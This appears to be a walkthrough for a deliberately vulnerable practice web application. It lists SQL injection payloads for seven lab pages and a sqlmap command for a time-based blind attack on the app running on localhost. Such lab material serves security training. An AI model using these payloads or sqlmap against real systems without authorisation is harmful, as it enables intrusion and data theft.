# How to perform SQL Injection in this Site

There are different payloads you can use to perform different kind of attacks and show different types of results in all 7 levels of SQL Injection in this site.

## Payloads to Display all Data in the table using Conditional Statement

### sql1.php:

**Payload:** _' or 1 = 1--'_

### sql2.php:

**Payload:** _1 or 1=1_

### sql3.php:

**Payload:** _1 or 1=1_

### sql4.php:

This file is relatively secure and prevents the conditional statement based attacks.

### sql5.php:

This file is relatively secure and prevents the conditional statement based attacks.

### sql6.php:

**Payload:** _' or 1 = 1--'_

**Payload:** _1 or 1=1_

### sql7.php:

**Payload:** _' or 1 = 1--'_

## Time Based Blind attack using SQLMap

### sql7.php:

1. Search for any book in the books table in the books database.
2. Copy the URL you get and paste it onto terminal with the sqlmap command. Here the book searched for was Things Fall Apart:

`sqlmap.py -u "http://localhost/Vulnerable-Web-Application/SQL/sql7.php?searchterm=Things+Fall+Apart" --tables`

3. Upon running the above command you'll be promoted to choose between yes or no for a lot of things. Choose yes for all.
4. Upon completion, a payload will apear on terminal. Copy and paste that onto the searchbox on sql7.php.
5. You'll see there's a sleep command with a number like 5 in brackets. The page takes 5 seconds to load before showing an output when searching for the payload.
6. Try changing the number in the sleep bracket to 10 and notice now it takes 10 seconds. This proves the time based blind SQL Injection is complete.
